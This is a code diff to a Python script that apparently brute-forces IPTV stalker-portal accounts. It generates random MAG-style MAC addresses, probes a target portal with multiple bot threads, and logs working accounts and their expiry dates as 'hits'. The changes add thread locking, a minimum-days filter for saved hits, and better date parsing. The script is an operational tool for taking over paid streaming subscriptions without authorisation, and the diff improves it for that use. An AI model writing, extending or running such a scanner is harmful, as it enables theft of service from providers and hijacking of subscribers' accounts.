@@ -55,6 +55,8 @@ scan_attempts = 0
 bot_count = 0
 default_mac_prefix = '00:1A:79:'
 use_stalker_c = True  # Control whether stalker portals append /c/
+min_days = 1
+lock = threading.Lock()
 
 # Predefined MAC prefixes
 mac_prefixes = [
@@ -176,7 +178,7 @@ def detect_endpoints(portal):
 
 # Get user input and detect portal types
 def get_user_input():
-    global server_url, scan_attempts, bot_count, default_mac_prefix, portal_endpoint, base_uri
+    global server_url, scan_attempts, bot_count, default_mac_prefix, portal_endpoint, base_uri, min_days
     server_url = input("Enter portal URL: ")
     server_url = re.sub(r'^https?://', '', server_url).rstrip('/')
 
@@ -205,6 +207,15 @@ def get_user_input():
             default_mac_prefix = mac_prefix_input.upper() + ':'
         else:
             print("Invalid MAC prefix format. Using default")
+
+    # Prompt for minimum days
+    min_days_input = input("Minimum days to save hit [default: 1]: ").strip()
+    if min_days_input:
+        try:
+            min_days = int(min_days_input)
+        except ValueError:
+            print("Invalid number. Using default.")
+    # Else default is 1
 
     # Detect portal types
     found_endpoints = detect_endpoints(server_url)
@@ -297,7 +308,7 @@ def parse_expiration_date(date_str):
         timestamp = time.mktime(date_obj.timetuple())
         return int((timestamp - time.time()) / 86400)
     except:
-        return ""
+        return None
 
 # Generate random MAC address
 def generate_mac(prefix=default_mac_prefix):
@@ -339,25 +350,11 @@ def hea2(macs, token):
 def format_hit(mac_address, expiration_date):
     global hit_count
     try:
-        # Remove time indication (e.g., '11:59 am')
-        expiration_date = re.sub(r'\d{1,2}:\d{2}\s*(?:AM|PM|am|pm)', '', expiration_date, flags=re.IGNORECASE).strip()
-
-        # Check for negative or <0 days
-        if "Days" in expiration_date:
-            days_str = expiration_date.split(" ")[-2]
-            try:
-                days = int(days_str)
-                if days < 0:
-                    print(f"Skipping hit with negative expiration: {mac_address} ({expiration_date})")
-                    return
-                if days < 1:
-                    print(f"Skipping hit with less than 1 day: {mac_address} ({expiration_date})")
-                    return
-            except ValueError:
-                pass
-
-        if mac_address not in seen_macs:
+        with lock:
+            if mac_address in seen_macs:
+                return
             seen_macs.add(mac_address)
+
             hit_data = f"""
 Date: {time.strftime('%d-%m-%Y %H:%M:%S')}
 Panel: http://{server_url}{base_uri}
@@ -365,8 +362,8 @@ Mac: {mac_address}
 Valid until: {expiration_date}
 ------
 """
+            print(hit_data)
             with open(output_file, 'a+', encoding='utf-8') as file:
-                print(hit_data)
                 file.write(hit_data + '\n')
             hit_count += 1
     except:
@@ -456,20 +453,43 @@ def scan_bot(bot_number):
                             break
 
                 if data.count('phone') != 0:
-                    expiration_date = ""
+                    raw_expiration = ""
                     if 'end_date' in data:
-                        expiration_date = data.split('end_date":"')[1].split('"')[0]
+                        raw_expiration = data.split('end_date":"')[1].split('"')[0]
                     else:
                         try:
-                            expiration_date = data.split('phone":"')[1].split('"')[0]
-                            if expiration_date.lower()[:2] == 'un':
-                                days_remaining = " Days"
-                            else:
-                                days_remaining = f"{parse_expiration_date(expiration_date)} Days"
-                                expiration_date = expiration_date + ' ' + days_remaining
+                            raw_expiration = data.split('phone":"')[1].split('"')[0]
                         except:
                             pass
-                    format_hit(mac_address, expiration_date)
+
+                    if raw_expiration:
+                        # Remove time indication (e.g., '11:59 am')
+                        raw_expiration = re.sub(r'\d{1,2}:\d{2}\s*(?:AM|PM|am|pm)', '', raw_expiration, flags=re.IGNORECASE).strip()
+
+                        expiration_date = raw_expiration
+                        days = None
+                        if raw_expiration.lower().startswith('un'):
+                            days = float('inf')
+                            expiration_date = "Unlimited"
+                        else:
+                            # Try parse as Month day, year
+                            days = parse_expiration_date(raw_expiration)
+                            if days is not None:
+                                expiration_date = f"{raw_expiration} ({days} Days)"
+                            else:
+                                # Try YYYY-MM-DD
+                                try:
+                                    date_obj = datetime.datetime.strptime(raw_expiration, '%Y-%m-%d')
+                                    days = (date_obj - datetime.datetime.now()).days
+                                    expiration_date = f"{raw_expiration} ({days} Days)"
+                                except:
+                                    pass
+
+                        if days is not None:
+                            if days < min_days:
+                                print(f"Skipping hit with less than {min_days} days: {mac_address} ({expiration_date})")
+                                continue
+                        format_hit(mac_address, expiration_date)
 
 # Main execution
 if __name__ == "__main__":
@@ -482,10 +502,10 @@ if __name__ == "__main__":
 
     # Set up output file path
     if platform.system() == 'Linux' and os.path.exists('/storage/emulated/0'):
-        output_dir = "/storage/emulated/0/hits/"
+        output_dir = "/storage/emulated/0/Downloads/"
     else:
         home = os.path.expanduser("~")
-        output_dir = os.path.join(home, "Downloads", "hits")
+        output_dir = os.path.join(home, "Downloads")
     if not os.path.exists(output_dir):
         os.makedirs(output_dir)
     output_file = output_dir + server_url.replace(":", "_").replace('/', '') + "_SimpleIptv_" + time.strftime('%d-%m-%Y') + ".txt"
